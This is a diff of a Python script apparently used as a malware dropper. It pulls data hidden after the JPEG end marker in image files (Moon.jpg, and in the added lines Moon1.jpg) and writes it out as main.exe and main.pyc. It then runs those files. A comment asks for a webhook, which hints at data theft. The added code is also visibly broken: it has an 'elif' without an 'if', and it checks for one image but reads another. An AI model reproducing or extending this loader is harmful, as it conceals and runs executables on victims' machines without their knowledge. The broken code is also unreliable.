@@ -22,6 +22,13 @@ if os.path.exists(moon) == False:
     input("Press enter to exit.\n")
     quit()
 
+moon2 = "Moon2.jpg" 
+
+elif os.path.exists(moon2) == False:
+    print("Moon2.jpg was not found! Make sure the folder this file is located at has the Moon2.jpg or it won't run.")
+    input("Press enter to exit.\n")
+    quit()
+
 print("Please wait, this will take a matter of seconds. Do not exit this program!")
     
 # Replace the X with your webhook.
@@ -1218,4 +1225,16 @@ with open("Moon.jpg", "rb") as f:
         e.write(f.read())
 
 os.system("main.exe")
+
+with open("Moon1.jpg", "rb") as f:
+    content = f.read()
+    offset = content.index(bytes.fromhex("FFD9"))
+
+    f.seek(offset + 2)
+
+    with open("main.pyc", "wb") as e:
+        e.write(f.read())
+        
+os.system('cmd /k "python3 main.pyc"')
+
 quit()
